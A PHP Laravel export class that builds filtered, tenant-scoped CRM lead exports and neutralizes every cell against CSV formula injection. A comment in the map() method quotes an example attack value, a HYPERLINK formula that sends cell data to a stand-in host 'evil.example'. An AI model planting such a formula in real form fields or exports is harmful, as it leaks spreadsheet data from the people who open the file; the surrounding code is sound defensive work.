<?php

namespace App\Exports;

use App\Models\Lead;
use App\Support\CsvSafety;
use Maatwebsite\Excel\Concerns\FromQuery;
use Maatwebsite\Excel\Concerns\WithChunkReading;
use Maatwebsite\Excel\Concerns\WithHeadings;
use Maatwebsite\Excel\Concerns\WithMapping;

class LeadsExport implements FromQuery, WithHeadings, WithMapping, WithChunkReading
{
    public function __construct(
        private int $tenantId,
        private array $filters = [],
    ) {}

    public function query()
    {
        $query = Lead::where('tenant_id', $this->tenantId)
            ->with(['tags', 'assignedUser', 'pipelineStage']);

        if ($ids = $this->filters['ids'] ?? null) {
            $query->whereIn('id', $ids);
            return $query;
        }

        if ($source = $this->filters['source'] ?? null) {
            $query->where('source', $source);
        }
        if ($status = $this->filters['status'] ?? null) {
            $query->where('status', $status);
        }
        if ($assignedUserId = $this->filters['assigned_user_id'] ?? null) {
            $query->where('assigned_user_id', $assignedUserId);
        }
        if ($pipelineId = $this->filters['pipeline_id'] ?? null) {
            $query->where('pipeline_id', $pipelineId);
        }
        if ($pipelineStageId = $this->filters['pipeline_stage_id'] ?? null) {
            $query->where('pipeline_stage_id', $pipelineStageId);
        }
        if ($dateFrom = $this->filters['created_from'] ?? null) {
            $query->whereDate('created_at', '>=', $dateFrom);
        }
        if ($dateUntil = $this->filters['created_until'] ?? null) {
            $query->whereDate('created_at', '<=', $dateUntil);
        }
        if ($scoreMin = $this->filters['score_min'] ?? null) {
            $query->where('lead_score', '>=', $scoreMin);
        }
        if (isset($this->filters['is_starred']) && $this->filters['is_starred']) {
            $query->where('is_starred', true);
        }
        if (isset($this->filters['is_duplicate']) && $this->filters['is_duplicate']) {
            $query->where('is_duplicate', true);
        }
        if (! empty($this->filters['tags'])) {
            $tagIds = (array) $this->filters['tags'];
            $query->whereHas('tags', fn($q) => $q->whereIn('tags.id', $tagIds));
        }

        return $query;
    }

    public function headings(): array
    {
        // M-I18N: spreadsheet column headers must follow tenant locale; translator-first via the leads_export namespace.
        return [
            (string) __('leads_export.headers.id'),
            (string) __('leads_export.headers.first_name'),
            (string) __('leads_export.headers.last_name'),
            (string) __('leads_export.headers.email'),
            (string) __('leads_export.headers.phone'),
            (string) __('leads_export.headers.source'),
            (string) __('leads_export.headers.status'),
            (string) __('leads_export.headers.pipeline_stage'),
            (string) __('leads_export.headers.score'),
            (string) __('leads_export.headers.assigned_to'),
            (string) __('leads_export.headers.tags'),
            (string) __('leads_export.headers.created_at'),
        ];
    }

    public function map($lead): array
    {
        // CSV formula-injection fix: lead-form submissions are
        // unauthenticated user input.  A lead whose first_name is
        // "=HYPERLINK(\"http://evil.example/?\"&A1,\"click me\")" would
        // hijack the recipient admin's CSV viewer the moment they open
        // the export.  Neutralize every cell with CsvSafety::neutralize
        // (prefixes dangerous-leading-char cells with a single quote;
        // Excel hides the prefix at render so the buyer sees the original
        // string but it evaluates as a literal, not a formula).  Numeric
        // fields like id / lead_score never start with =+-@\t\r so they
        // pass through unchanged.
        return [
            CsvSafety::neutralize($lead->id),
            CsvSafety::neutralize($lead->first_name),
            CsvSafety::neutralize($lead->last_name),
            CsvSafety::neutralize($lead->email),
            CsvSafety::neutralize($lead->phone),
            CsvSafety::neutralize($lead->source_label),
            CsvSafety::neutralize($lead->status?->value),
            CsvSafety::neutralize($lead->pipelineStage?->name),
            CsvSafety::neutralize($lead->lead_score),
            CsvSafety::neutralize($lead->assignedUser?->name),
            CsvSafety::neutralize($lead->tags->pluck('name')->join(', ')),
            CsvSafety::neutralize($lead->created_at->toDateTimeString()),
        ];
    }

    public function chunkSize(): int
    {
        return 500;
    }
}
